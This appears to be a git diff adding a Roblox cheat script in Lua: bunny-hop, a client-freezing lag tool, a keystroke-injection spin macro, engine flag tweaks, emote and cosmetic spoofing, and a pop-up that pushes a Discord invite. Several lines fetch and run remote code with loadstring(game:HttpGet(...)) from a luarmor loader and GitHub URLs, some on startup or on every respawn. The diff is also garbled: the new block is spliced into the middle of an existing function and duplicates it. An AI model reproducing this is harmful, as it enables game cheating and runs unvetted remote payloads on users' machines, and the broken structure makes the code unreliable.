@@ -198,13 +198,272 @@ end)
 
 -- [[ 🛠️ 功能一：Lag Tool 專屬視窗 (長按 2 秒拖曳版) ]]
 local function createLagToolWindow()
+    -- 檢查是否已存在，避免重複執行
     if p.PlayerGui:FindFirstChild("LagTool_Floating") then 
         p.PlayerGui.LagTool_Floating:Destroy() 
     end
 
-    local lagSg = Instance.new("ScreenGui", p.PlayerGui)
+    local lagSg = Instance.new("ScreenGui")
     lagSg.Name = "LagTool_Floating"
     lagSg.DisplayOrder = 2000 
+    -- 【核心修正】：設為 false 確保重生不消失
+    lagSg.ResetOnSpawn = false 
+    lagSg.Parent = p.PlayerGui
+    
+    -- 核心：長按 2 秒解鎖拖曳
+    local function makeDraggable(gui)
+        local dragging, dragInput, dragStart, startPos
+        local moved = false
+        local canMove = false
+        local holdTime = 2 
+
+        gui.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                moved = false
+                canMove = false
+                
+                task.spawn(function()
+                    local start = os.clock()
+                    while dragging do
+                        if os.clock() - start >= holdTime then
+                            canMove = true
+                            gui.BorderColor3 = Color3.new(0, 1, 0) -- 變綠色代表可以開始拖了
+                            break
+                        end
+                        task.wait(0.1)
+                    end
+                end)
+
+                dragStart = input.Position
+                startPos = gui.Position
+                
+                local connection; connection = input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then 
+                        dragging = false 
+                        canMove = false
+                        gui.BorderColor3 = Color3.new(0, 0, 0) 
+                        connection:Disconnect()
+                    end
+                end)
+            end
+        end)
+
+        gui.InputChanged:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+                dragInput = input
+            end
+        end)-- [[ 📥 核心負載部署區 (特殊符號裝飾) ]] --
+-- [[ ╔════════════════════════════════════════════════════╗ ]] --
+-- [[ ║  ███████╗███████╗ █████╗ ██╗     ██████╗  █████╗   ║ ]] --
+-- [[ ║  ██╔════╝██╔════╝██╔══██╗██║     ██╔══██╗██╔══██╗  ║ ]] --
+-- [[ ║  █████╗  ███████╗███████║██║     ██████╔╝╚██████║  ║ ]] --
+-- [[ ║  ██╔══╝  ╚════██║██╔══██║██║     ██╔══██╗ ╚═══██║  ║ ]] --
+-- [[ ║  ███████╗███████║██║  ██║███████╗██║  ██║ █████╔╝  ║ ]] --
+-- [[ ╚════════════════════════════════════════════════════╝ ]] --
+
+-- [[ 📥 核心變數初始化 ]]
+_G.fKN = _G.fKN or "PageDown"           
+_G.freezeMS = _G.freezeMS or 300      
+_G.isMinimized = _G.isMinimized or false 
+_G.toggleKey = _G.toggleKey or Enum.KeyCode.T
+_G.switchInterval = _G.switchInterval or 0.08
+_G.sensitivity = _G.sensitivity or 0.087
+_G.bhop = false
+_G.freeze = false
+
+local p = game:GetService("Players").LocalPlayer
+local UIS = game:GetService("UserInputService")
+local SG = game:GetService("StarterGui")
+local VIM = game:GetService("VirtualInputManager")
+local RS = game:GetService("RunService")
+local VU = game:GetService("VirtualUser")
+local Cam = workspace.CurrentCamera
+local DC_CODE = "XF4PTA5Pgp"
+local DC_URL = "https://discord.gg/" .. DC_CODE
+local BG_IMAGE_ID = "rbxassetid://117164248667049"
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+-- [[ 🔔 系統通知封裝 ]]
+local function notify(title, text, duration)
+    pcall(function()
+        SG:SetCore("SendNotification", {
+            Title = title or "SYSTEM",
+            Text = text or "",
+            Duration = duration or 2,
+            Icon = "rbxassetid://6023426926"
+        })
+    end)
+end
+
+-- [[ ⌨️ AD (Spin) 邏輯變數 ]]
+local activeAD = false
+_G.switchInterval = _G.switchInterval or 0.08
+local pressDuration = 0.000000001 
+_G.sensitivity = _G.sensitivity or 0.087
+local lastCameraAngle = select(2, Cam.CFrame:ToOrientation())
+
+-- 1. 定義智能重置函數 (已修復手動衝突問題)
+local function forceReset()
+    activeAD = false
+    
+    -- 檢查：只有當玩家「手動沒按著」A 時，才發送放開指令
+    if not UIS:IsKeyDown(Enum.KeyCode.A) then
+        VIM:SendKeyEvent(false, Enum.KeyCode.A, false, game)
+    end
+    
+    -- 檢查：只有當玩家「手動沒按著」D 時，才發送放開指令
+    if not UIS:IsKeyDown(Enum.KeyCode.D) then
+        VIM:SendKeyEvent(false, Enum.KeyCode.D, false, game)
+    end
+    
+    print("\\\\ SYSTEM \\\\ [[ SPIN_DEACTIVATED - MANUAL_PRESERVED ]]")
+end
+
+-- [[ 🚀 標頭輸出：ANSI 3D 立體斜體 ]]
+local function showHeader()
+    local wall = "///////////////////////////////////////////////////////////////////////////////////"
+    local floor = "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"
+    print("\n" .. wall)
+    print([[										
+  ________  ________  ________  ___       ________   _______
+ |\   ____\|\   ____\|\   __  \|\  \     |\   __  \|\   __  \
+ \ \  \___|\ \  \____| \  \|\  \ \  \    \ \  \|\  \ \  \|\  \
+  \ \  \___\\ \_____  \ \   __  \ \  \    \ \  _____\ \_____  \
+   \ \  \__|_\| _____\ \ \  \ \  \ \  \____\ \  \\_ \_|_____\  \
+    \ \_______\ \_______\ \__\ \__\ \_______\ \__\ \ _\\\_______\
+     \|_______|\|_______|\|__|\|__|\|_______|\|__|\|__|\|_______|
+    ]])
+    print(floor)
+    print("|||| \\\\ //// @@@@ [ SYSTEM_OVERRIDE_INITIATED ] @@@@ //// \\\\ ||||")
+    print("|||| OPERATOR : @E5alR9          |||| SECURITY : LEVEL_MAX     ||||")
+    print("|||| STATUS   : OVERCLOCKED      |||| KERNEL   : STABLE        ||||")
+    print(floor)
+    print(wall .. "\n")
+end
+showHeader()
+
+-- [[ 🛠️ 模組一：資源部署 - 雙重詢問版 ]]
+task.spawn(function()
+    print("//// #### [M1] DATA_DEPLOYMENT_START #### ////")
+    _G.emoteSwaps = { { current = "APose", needed = "Broom" } }
+    
+    local function dl(u) 
+        task.spawn(function() 
+            print("\\\\\\\\ HTTP \\\\\\\\ <REQUESTING_REMOTE_PAYLOAD> ...")
+            local s, e = pcall(function() loadstring(game:HttpGet(u))() end) 
+            if s then print("|||| SUCCESS |||| %%% Payload_Injected_Successfully") 
+            else print("|||| ERROR |||| !!! Failure: " .. tostring(e)) end
+        end) 
+    end
+    dl("https://api.luarmor.net/files/v3/loaders/36d5417f898691cb6c6d347b077e01e2.lua")
+
+    local S = game:GetService("ReplicatedStorage"):WaitForChild("Items")
+    
+    local function dup(folder, old, new) 
+        local i = folder:FindFirstChild(old) 
+        if i then 
+            print("//// CLONE //// " .. old .. " ===>>> " .. new)
+            i:Clone().Parent = folder i.Name = new 
+        end 
+    end
+
+    -- [[ 🔔 詢問 1: Rockin ]]
+    local rockinBind = Instance.new("BindableFunction")
+    rockinBind.OnInvoke = function(answer)
+        if answer == "NO" then
+            dup(S.Emotes, "RockinStride", "Stride")
+        else
+            print("|||| CHOICE: YES |||| Skipping RockinStride")
+        end
+    end
+
+    -- [[ 🔔 詢問 2: Broom ]]
+    local broomBind = Instance.new("BindableFunction")
+    broomBind.OnInvoke = function(answer)
+        if answer == "NO" then
+            dup(S.Emotes, "Broom", "SnowmobileCruise")
+        else
+            print("|||| CHOICE: YES |||| Skipping Broom")
+        end
+    end
+
+    -- 執行通知
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "SYSTEM CHECK";
+            Text = "do u have Rockin?";
+            Duration = 99999;
+            Button1 = "YES";
+            Button2 = "NO";
+            Callback = rockinBind;
+        })
+        
+        task.wait(2) -- 稍微延遲避免通知打架
+        
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "SYSTEM CHECK";
+            Text = "do u have Broom?";
+            Duration = 99999;
+            Button1 = "YES";
+            Button2 = "NO";
+            Callback = broomBind;
+        })
+    end)
+
+    -- 無論如何都執行的部分 (Cosmetics)
+    pcall(function()
+        dup(S.Cosmetics, "ToxicInferno", "BorealisAurora")
+    end)
+
+    -- 防掛機系統 (保持原樣)
+    p.Idled:Connect(function() 
+        VU:CaptureController() 
+        VU:ClickButton2(Vector2.zero) 
+        print("//// PULSE //// Activity_Heartbeat_Sent")
+    end)
+end)
+
+-- [[ ⚙️ 模組二：引擎同步 ]]
+task.spawn(function()
+    task.wait(1.5) 
+    print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ [ ENGINE_SYNCHRONIZATION ] ////////////////////")
+    if #game.Players:GetPlayers() == 1 then
+        print("\\\\ CHECK \\\\ Solo_Mode_Active...")
+        local E = game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Emotes")
+        local s, r, b = E:FindFirstChild("Stride"), E:FindFirstChild("RockinStride"), E:FindFirstChild("Broom")
+        
+        if s and r and b then
+            print("\\\\ SYNC \\\\ Overwriting_Classic_Modules...")
+            local bm, rm = b:FindFirstChild("EmoteModuleClassic"), r:FindFirstChild("EmoteModuleClassic")
+            if bm and rm then
+                local nm = bm:Clone()
+                nm:ClearAllChildren()
+                for _, o in ipairs(rm:GetChildren()) do o:Clone().Parent = nm end
+                rm:Destroy()
+                nm.Name, nm.Parent = "EmoteModuleClassic", r
+            end
+            s:ClearAllChildren()
+            for _, i in ipairs(r:GetChildren()) do i:Clone().Parent = s end
+            print("\\\\ DONE \\\\ Deep_Integrity_Check_Pass")
+        end
+    end
+end)
+
+-- [[ 🛠️ 功能一：Lag Tool 專屬視窗 (長按 2 秒拖曳版) ]]
+local function createLagToolWindow()
+    -- 檢查是否已存在，避免重複執行
+    if p.PlayerGui:FindFirstChild("LagTool_Floating") then 
+        p.PlayerGui.LagTool_Floating:Destroy() 
+    end
+
+    local lagSg = Instance.new("ScreenGui")
+    lagSg.Name = "LagTool_Floating"
+    lagSg.DisplayOrder = 2000 
+    -- 【核心修正】：設為 false 確保重生不消失
+    lagSg.ResetOnSpawn = false 
+    lagSg.Parent = p.PlayerGui
     
     -- 核心：長按 2 秒解鎖拖曳
     local function makeDraggable(gui)
@@ -251,7 +510,8 @@ local function createLagToolWindow()
             end
         end)
 
-        UIS.InputChanged:Connect(function(input)
+        -- 注意：這裡需要確認 UIS 變數已定義 (game:GetService("UserInputService"))
+        game:GetService("UserInputService").InputChanged:Connect(function(input)
             if input == dragInput and dragging and canMove then
                 local delta = input.Position - dragStart
                 if delta.Magnitude > 2 then moved = true end
@@ -270,7 +530,7 @@ local function createLagToolWindow()
     lagBtn.Text = "LAG"
     lagBtn.TextColor3 = Color3.new(1, 1, 1)
     lagBtn.TextSize = 14
-    lagBtn.BorderSizePixel = 2 -- 增加邊框寬度，讓變色更明顯
+    lagBtn.BorderSizePixel = 2 
     
     local isLagMoved = makeDraggable(lagBtn)
 
@@ -290,7 +550,10 @@ local function createLagToolWindow()
     lagBtn.MouseButton1Click:Connect(function()
         if isLagMoved() then return end
         local currentMS = tonumber(_G.freezeMS) or 300
-        notify("LAG", currentMS .. "ms", 0.5)
+        -- 確保 notify 函式存在，若不存在請移除此行
+        if pcall(function() return notify end) then
+            notify("LAG", currentMS .. "ms", 0.5)
+        end
         task.wait(0.01)
         local t = os.clock()
         while os.clock() - t < (currentMS / 1000) do end
@@ -298,7 +561,416 @@ local function createLagToolWindow()
 
     closeBtn.MouseButton1Click:Connect(function() 
         if isCloseMoved() then return end
-        lagSg:Destroy() 
+        lagSg:Destroy() -- 依照你的要求，點擊 CLOSE 依然會永久刪除
+    end)
+end
+
+-- [[ 🖥️ 介面處理核心 - 完全整合版 ]]
+local function createUI()
+    if p.PlayerGui:FindFirstChild("E5_Console") then p.PlayerGui.E5_Console:Destroy() end
+    local sg = Instance.new("ScreenGui", p.PlayerGui)
+    sg.Name, sg.ResetOnSpawn, sg.DisplayOrder = "E5_Console", false, 999
+    
+    local m = Instance.new("Frame", sg)
+    m.Size = _G.isMinimized and UDim2.new(0, 100, 0, 30) or UDim2.new(0, 400, 0, 430)
+    m.Position = UDim2.new(0, 210, 0, -40)
+    m.BackgroundColor3, m.BackgroundTransparency, m.BorderSizePixel = Color3.new(0,0,0), 1, 1
+    m.Active, m.Draggable = true, true
+
+    local bg = Instance.new("ImageLabel", m)
+    bg.Size, bg.Image, bg.ScaleType = UDim2.new(1, 0, 1, 0), BG_IMAGE_ID, Enum.ScaleType.Stretch
+    bg.BackgroundTransparency, bg.Visible = 1, not _G.isMinimized
+
+    local bar = Instance.new("Frame", m)
+    bar.Size, bar.BackgroundColor3, bar.ZIndex = UDim2.new(1, 0, 0, 30), Color3.new(0.05, 0.05, 0.05), 5
+    
+    local xBtn = Instance.new("TextButton", bar)
+    xBtn.Size, xBtn.Position, xBtn.Text = UDim2.new(0, 30, 0, 30), UDim2.new(1, -30, 0, 0), "X"
+    xBtn.TextColor3, xBtn.BackgroundTransparency, xBtn.ZIndex, xBtn.TextSize = Color3.new(1, 0.2, 0.2), 1, 6, 18
+    xBtn.MouseButton1Click:Connect(function() sg:Destroy() end)
+
+    local minBtn = Instance.new("TextButton", bar)
+    minBtn.Size, minBtn.Position, minBtn.Text = UDim2.new(0, 30, 0, 30), UDim2.new(1, -60, 0, 0), _G.isMinimized and "+" or "-"
+    minBtn.TextColor3, minBtn.BackgroundTransparency, minBtn.ZIndex, minBtn.TextSize = Color3.new(1, 1, 1), 1, 6, 18
+
+    local content = Instance.new("Frame", m)
+    content.Size = UDim2.new(1, 0, 0, 150)
+    content.Position = UDim2.new(0, 0, 1, -160)
+    content.BackgroundTransparency, content.Visible = 1, not _G.isMinimized 
+
+-- 第一排：LAG TOOL | KEY | SPD | SNS
+local lagToolBtn = Instance.new("TextButton", content)
+lagToolBtn.Size = UDim2.new(0.35, 0, 0, 40)
+lagToolBtn.Position = UDim2.new(0.02, 0, 0, 0)
+lagToolBtn.Text = "TOOL"
+lagToolBtn.BackgroundColor3 = Color3.new(0.2, 0, 0)
+lagToolBtn.TextColor3 = Color3.new(1, 0.5, 0.5)
+lagToolBtn.BackgroundTransparency = 0.7
+lagToolBtn.MouseButton1Click:Connect(function()
+    -- 1. 保留原本功能：打開 LAG TOOL 的設定視窗
+    if createLagToolWindow then
+        createLagToolWindow()
+    end
+    
+    -- 2. 新增功能：執行遠端 SPIN 腳本
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/E5alR9/E5s/refs/heads/main/spin"))()
+    end)
+end)
+
+local spinKeyBtn = Instance.new("TextButton", content)
+spinKeyBtn.Size, spinKeyBtn.Position = UDim2.new(0.18, 0, 0, 40), UDim2.new(0.38, 0, 0, 0)
+spinKeyBtn.Text = "K:".._G.toggleKey.Name
+spinKeyBtn.BackgroundColor3, spinKeyBtn.TextColor3, spinKeyBtn.BackgroundTransparency = Color3.new(0,0,0), Color3.new(1,1,1), 0.7
+spinKeyBtn.MouseButton1Click:Connect(function()
+    spinKeyBtn.Text = "..."
+    local con; con = UIS.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.Keyboard then
+            _G.toggleKey = i.KeyCode
+            spinKeyBtn.Text = "K:".._G.toggleKey.Name
+            notify("KEYBIND", "Spin Key: ".._G.toggleKey.Name)
+            con:Disconnect()
+        end
+    end)
+end)
+
+local spdBox = Instance.new("TextBox", content)
+spdBox.Size, spdBox.Position, spdBox.Text = UDim2.new(0.18, 0, 0, 40), UDim2.new(0.58, 0, 0, 0), tostring(_G.switchInterval)
+spdBox.BackgroundColor3, spdBox.TextColor3, spdBox.BackgroundTransparency = Color3.new(0,0,0), Color3.new(1,1,0), 0.7
+spdBox.FocusLost:Connect(function()
+    _G.switchInterval = tonumber(spdBox.Text) or 0.08
+    notify("SPD", "Interval: ".._G.switchInterval)
+end)
+
+-- 這裡是重點：讓 UI 能修改 _G.sensitivity
+local sensBox = Instance.new("TextBox", content)
+sensBox.Size, sensBox.Position, sensBox.Text = UDim2.new(0.18, 0, 0, 40), UDim2.new(0.78, 0, 0, 0), tostring(_G.sensitivity)
+sensBox.BackgroundColor3, sensBox.TextColor3, sensBox.BackgroundTransparency = Color3.new(0,0,0), Color3.new(0,1,1), 0.7
+sensBox.FocusLost:Connect(function()
+    local val = tonumber(sensBox.Text)
+    if val then 
+        _G.sensitivity = val
+        notify("SENS", "Sensitivity: ".._G.sensitivity)
+    end
+end)
+
+    -- 第二排：PGDN (fKN) | MS
+    local l = Instance.new("TextButton", content)
+    l.Size, l.Position, l.Text = UDim2.new(0.42, 0, 0, 40), UDim2.new(0.05, 0, 0, 50), _G.fKN
+    l.BackgroundColor3, l.TextColor3, l.BackgroundTransparency = Color3.new(0,0,0), Color3.new(1,1,1), 0.7
+    l.MouseButton1Click:Connect(function()
+        l.Text = "..."
+        local con; con = UIS.InputBegan:Connect(function(i) 
+            if i.UserInputType == Enum.UserInputType.Keyboard then 
+                _G.fKN = i.KeyCode.Name; l.Text = _G.fKN; con:Disconnect() 
+                notify("SYSTEM", "Freeze Key: " .. _G.fKN)
+            end 
+        end)
+    end)
+
+    local tb = Instance.new("TextBox", content)
+    tb.Size, tb.Position, tb.Text = UDim2.new(0.42, 0, 0, 40), UDim2.new(0.53, 0, 0, 50), tostring(_G.freezeMS)
+    tb.BackgroundColor3, tb.TextColor3, tb.BackgroundTransparency = Color3.new(0,0,0), Color3.new(1,1,0), 0.7
+    tb.FocusLost:Connect(function()
+        local val = tonumber(tb.Text)
+        if val then _G.freezeMS = val; notify("SYSTEM", "MS: " .. _G.freezeMS) end
+    end)
+
+    -- 第三排：SETFFLAG
+    local fBtn = Instance.new("TextButton", content)
+    fBtn.Size, fBtn.Position, fBtn.Text = UDim2.new(0.42, 0, 0, 40), UDim2.new(0.05, 0, 0, 100), "DisplayFPS(RE)"
+    fBtn.BackgroundColor3, fBtn.TextColor3, fBtn.BackgroundTransparency = Color3.new(0,0,0), Color3.new(0,1,1), 0.7
+    fBtn.MouseButton1Click:Connect(function()
+        pcall(function() setfflag("DebugDisplayFPS", "true") end)
+        game:GetService("TeleportService"):Teleport(game.PlaceId, p)
+    end)
+
+    local sBtn = Instance.new("TextButton", content)
+    sBtn.Size, sBtn.Position, sBtn.Text = UDim2.new(0.42, 0, 0, 40), UDim2.new(0.53, 0, 0, 100), "Missedworld(RE)"
+    sBtn.BackgroundColor3, sBtn.TextColor3, sBtn.BackgroundTransparency = Color3.new(0,0,0), Color3.new(0,1,0), 0.7
+    sBtn.MouseButton1Click:Connect(function()
+        pcall(function() setfflag("MaxMissedWorldStepsRemembered", "2147483467") end)
+        game:GetService("TeleportService"):Teleport(game.PlaceId, p)
+    end)
+
+    minBtn.MouseButton1Click:Connect(function()
+        _G.isMinimized = not _G.isMinimized
+        m.Size = _G.isMinimized and UDim2.new(0, 100, 0, 30) or UDim2.new(0, 400, 0, 430)
+        bg.Visible, content.Visible = not _G.isMinimized, not _G.isMinimized
+        minBtn.Text = _G.isMinimized and "+" or "-"
+    end)
+end
+
+-- [[ 啟動執行流程 ]]
+createUI()
+
+-- [[ 🔄 角色處理：確保重生後無頭與斷腳持續生效 ]]
+local function run(c)
+    if not c then return end
+    
+    -- 1. 處理 UI 控制台 (如果是本地玩家自己)
+    local charPlayer = Players:GetPlayerFromCharacter(c)
+    if charPlayer == lp then
+        task.spawn(function()
+            local gui = lp:WaitForChild("PlayerGui", 10)
+            -- 這裡建議增加檢查 E5_Console 是否存在的邏輯
+            local console = gui:WaitForChild("E5_Console", 5)
+            if console then 
+                console.Enabled = true 
+            end
+        end)
+    end
+
+    -- 2. 外觀處理：無頭與斷腳 (Korblox)
+    task.spawn(function()
+        -- 等待頭部加載，最長等待 10 秒
+        local h = c:WaitForChild("Head", 10)
+        if h then 
+            task.wait(0.2) -- 稍微延長等待，確保所有裝飾品加載完畢
+            
+            -- 透明化頭部
+            h.Transparency = 1 
+            
+            -- 執行遠端斷腳腳本
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/E5alR9/E5s/refs/heads/main/bestkorblox"))()
+            end)
+            
+            -- 透明化所有面部貼圖 (Faces, Decals)
+            for _, v in ipairs(h:GetChildren()) do 
+                if v:IsA("Decal") or v:IsA("Texture") then 
+                    v.Transparency = 1 
+                end 
+            end 
+        end
+    end)
+end
+
+-- [[ 🚀 角色監控系統 (全服適用) ]]
+local function monitor(plr)
+    -- 監聽該玩家未來每一次的重生 (CharacterAdded)
+    plr.CharacterAdded:Connect(function(char)
+        run(char)
+    end)
+    
+    -- 如果該玩家目前已經在場上，立即執行一次
+    if plr.Character then 
+        task.spawn(run, plr.Character) 
+    end
+end
+
+-- [[ 🏁 系統啟動流程 ]]
+task.spawn(function()
+    print("//// #### [M3] GLOBAL_SYSTEM_RUNNING #### ////")
+
+    -- 1. 針對目前伺服器中已存在的玩家啟動監控
+    for _, plr in ipairs(Players:GetPlayers()) do
+        monitor(plr)
+    end
+    
+    -- 2. 針對後續才加入伺服器的玩家啟動監控
+    Players.PlayerAdded:Connect(monitor)
+end)
+
+-- [[ ⌨️ 輸入偵測核心：啟動與停止 (智能重置版) ]]
+
+-- 1. 偵測按下
+UIS.InputBegan:Connect(function(i, processed)
+    if processed then return end 
+    
+    if i.KeyCode == Enum.KeyCode.Space then 
+        _G.bhop = true 
+    elseif i.KeyCode.Name == _G.fKN then 
+        _G.freeze = true 
+    elseif i.KeyCode == _G.toggleKey then 
+        activeAD = true
+        print("\\\\ SYSTEM \\\\ [[ SPIN_ACTIVATED ]]")
+    end 
+end)
+
+-- 2. 偵測放開 (包含智能重置檢查)
+UIS.InputEnded:Connect(function(i) 
+    if i.KeyCode == Enum.KeyCode.Space then 
+        _G.bhop = false 
+    elseif i.KeyCode.Name == _G.fKN then 
+        _G.freeze = false 
+    elseif i.KeyCode == _G.toggleKey then 
+        -- 呼叫智能重置，會判斷你是否按著 AD
+        forceReset()
+    end 
+end)
+
+-- 3. 強制保險絲 (每 0.5 秒同步狀態)
+task.spawn(function()
+    while true do
+        -- 如果開關變數是開啟的，但實體按鍵沒被按下，執行智能重置
+        if activeAD and not UIS:IsKeyDown(_G.toggleKey) then
+            forceReset()
+        end
+        task.wait(0.5)
+    end
+end)
+
+-- 2. 物理循環：處理 Bhop 與 Freeze
+RS.Heartbeat:Connect(function()
+    local c = p.Character
+    local r = c and c:FindFirstChild("HumanoidRootPart")
+    local hum = c and c:FindFirstChildOfClass("Humanoid")
+
+    -- [[ Bhop 邏輯 ]]
+    if _G.bhop and hum and hum.FloorMaterial ~= Enum.Material.Air then 
+        hum:ChangeState(3) 
+    end
+
+    -- [[ Freeze 核心 (射線觸發版) ]]
+    if _G.freeze and r then
+        local lp = RaycastParams.new()
+        lp.FilterDescendantsInstances = {c}
+        
+        -- 判定：腳下 20 單位或前方 15 單位有物體時觸發
+        if workspace:Raycast(r.Position, Vector3.new(0,-20,0), lp) or workspace:Raycast(r.Position, r.CFrame.LookVector*15, lp) then
+            
+            -- 跳出 UI 通知
+            game:GetService("StarterGui"):SetCore("SendNotification", { 
+                Title = "SYSTEM"; 
+                Text = "Freeze: " .. tostring(_G.freezeMS) .. "ms"; 
+                Duration = 0.5; 
+            })
+            
+            -- 執行物理阻斷 (依據 UI 設定的 ms)
+            local t = os.clock() 
+            local delayTime = (tonumber(_G.freezeMS) or 300) / 1000
+            while os.clock() - t < delayTime do end 
+        end
+    end
+end)
+
+-- [[ ⌨️ 核心 AD 旋轉邏輯循環 - 最終調試版 ]]
+task.spawn(function()
+    while true do
+        local manualA = UIS:IsKeyDown(Enum.KeyCode.A)
+        local manualD = UIS:IsKeyDown(Enum.KeyCode.D)
+        local isMovingManually = manualA or manualD
+
+        if activeAD and not isMovingManually then
+            pcall(function()
+                local _, currentY, _ = Cam.CFrame:ToOrientation()
+                local deltaY = currentY - lastCameraAngle
+                
+                if deltaY > math.pi then deltaY = deltaY - (math.pi * 2)
+                elseif deltaY < -math.pi then deltaY = deltaY + (math.pi * 2) end
+
+                if math.abs(deltaY) > (_G.sensitivity or 0.087) then
+                    local firstKey = (deltaY < 0) and Enum.KeyCode.D or Enum.KeyCode.A
+                    local secondKey = (deltaY < 0) and Enum.KeyCode.A or Enum.KeyCode.D
+                    
+                    lastCameraAngle = currentY 
+
+                    VIM:SendKeyEvent(true, firstKey, false, game)
+                    task.wait(pressDuration)
+                    VIM:SendKeyEvent(false, firstKey, false, game)
+
+                    task.wait(_G.switchInterval) -- 對接 UI
+
+                    if activeAD and not (UIS:IsKeyDown(Enum.KeyCode.A) or UIS:IsKeyDown(Enum.KeyCode.D)) then
+                        VIM:SendKeyEvent(true, secondKey, false, game)
+                        task.wait(pressDuration)
+                        VIM:SendKeyEvent(false, secondKey, false, game)
+                    end
+                    
+                    task.wait(_G.switchInterval) -- 對接 UI
+                else
+                    lastCameraAngle = currentY
+                    task.wait(0.01) 
+                end
+            end)
+        else
+            lastCameraAngle = select(2, Cam.CFrame:ToOrientation())
+            task.wait(0.05)
+        end
+    end
+end)
+
+-- [[ 📡 Module 4: Social Daemon ]]
+task.spawn(function()
+    print("//// [M4] STARTING SOCIAL_DAEMON ////////")
+    local bindable = Instance.new("BindableFunction")
+    bindable.OnInvoke = function(answer)
+        if answer == "YES" then
+            print("|||| [SOCIAL] ACCEPTED ////////")
+            local req = (syn and syn.request) or (http and http.request) or http_request or request
+            if req then pcall(function() req({Url = "http://127.0.0.1:6463/rpc?v=1", Method = "POST", Headers = {["Content-Type"] = "application/json", ["Origin"] = "https://discord.com"}, Body = game:GetService("HttpService"):JSONEncode({cmd = "INVITE_BROWSER", args = {code = DC_CODE}, nonce = game:GetService("HttpService"):GenerateGUID(false)})}) end) end
+            if setclipboard then setclipboard(DC_URL) end
+        elseif answer == "NO" then
+            print("|||| [SOCIAL] DECLINED :-( ////////")
+            task.delay(0.5, function() game:GetService("StarterGui"):SetCore("SendNotification", { Title = ":("; Text = "Maybe next time..."; Duration = 5; }) end)
+        end
+    end
+    local function sendInvite()
+        return pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", { Title = "E5alR9 - DISCORD", Text = "Join for more useful?", Duration = 99999, Button1 = "YES", Button2 = "NO", Callback = bindable }) end)
+    end
+    task.wait(5)
+    local sent = false
+    repeat sent = sendInvite() if not sent then task.wait(2) end until sent == true
+end)
+
+task.wait(6)
+print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ALL SYSTEMS LOADED | @E5ALR9 ////////////////////")
+print("//// [SYSTEM] READY TO OPERATE AT RING-0 ////")
+
+
+        -- 注意：這裡需要確認 UIS 變數已定義 (game:GetService("UserInputService"))
+        game:GetService("UserInputService").InputChanged:Connect(function(input)
+            if input == dragInput and dragging and canMove then
+                local delta = input.Position - dragStart
+                if delta.Magnitude > 2 then moved = true end
+                gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+            end
+        end)
+        
+        return function() return moved end
+    end
+
+    -- 1. LAG 按鈕
+    local lagBtn = Instance.new("TextButton", lagSg)
+    lagBtn.Size = UDim2.new(0, 80, 0, 40)
+    lagBtn.Position = UDim2.new(0.5, -65, 0.85, 0)
+    lagBtn.BackgroundColor3 = Color3.new(0.4, 0, 0)
+    lagBtn.Text = "LAG"
+    lagBtn.TextColor3 = Color3.new(1, 1, 1)
+    lagBtn.TextSize = 14
+    lagBtn.BorderSizePixel = 2 
+    
+    local isLagMoved = makeDraggable(lagBtn)
+
+    -- 2. CLOSE 按鈕
+    local closeBtn = Instance.new("TextButton", lagSg)
+    closeBtn.Size = UDim2.new(0, 60, 0, 30)
+    closeBtn.Position = UDim2.new(0.5, 25, 0.85, 0)
+    closeBtn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    closeBtn.Text = "CLOSE"
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.TextSize = 14
+    closeBtn.BorderSizePixel = 2
+    
+    local isCloseMoved = makeDraggable(closeBtn)
+
+    -- 邏輯綁定
+    lagBtn.MouseButton1Click:Connect(function()
+        if isLagMoved() then return end
+        local currentMS = tonumber(_G.freezeMS) or 300
+        -- 確保 notify 函式存在，若不存在請移除此行
+        if pcall(function() return notify end) then
+            notify("LAG", currentMS .. "ms", 0.5)
+        end
+        task.wait(0.01)
+        local t = os.clock()
+        while os.clock() - t < (currentMS / 1000) do end
+    end)
+
+    closeBtn.MouseButton1Click:Connect(function() 
+        if isCloseMoved() then return end
+        lagSg:Destroy() -- 依照你的要求，點擊 CLOSE 依然會永久刪除
     end)
 end
 
